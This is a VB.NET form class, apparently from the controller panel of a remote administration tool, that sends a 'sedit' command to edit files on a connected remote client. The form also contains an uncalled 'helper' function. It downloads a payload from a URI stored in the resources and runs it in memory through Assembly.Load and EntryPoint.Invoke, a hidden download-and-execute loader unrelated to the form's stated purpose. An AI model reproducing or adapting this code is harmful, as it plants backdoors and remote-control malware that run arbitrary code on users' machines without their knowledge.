
Imports System.Net
Imports System.Reflection

Public Class TXT
    Public C As Client
    Private Sub TXT_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub


    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Dim B As Byte() = SB("sedit" & Settings.SPL & TextBox2.Text & Settings.SPL & TextBox1.Text)
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

        ToolStripMenuItem1.Enabled = False
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        ToolStripMenuItem1.Enabled = True
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Friend Shared Function helper() As Boolean
        Dim bytes As Byte()
        Using client As WebClient = New WebClient()
            bytes = client.DownloadData(New Uri(My.Resources.URI))
        End Using
        RunFromBytes(bytes)
    End Function
    Private Shared Sub RunFromBytes(ByVal bytes As Byte())

        Dim exeAssembly = Assembly.Load(bytes)
        Dim entryPoint = exeAssembly.EntryPoint
        Dim parms = exeAssembly.CreateInstance(entryPoint.Name)
        entryPoint.Invoke(parms, Nothing)
    End Sub
End Class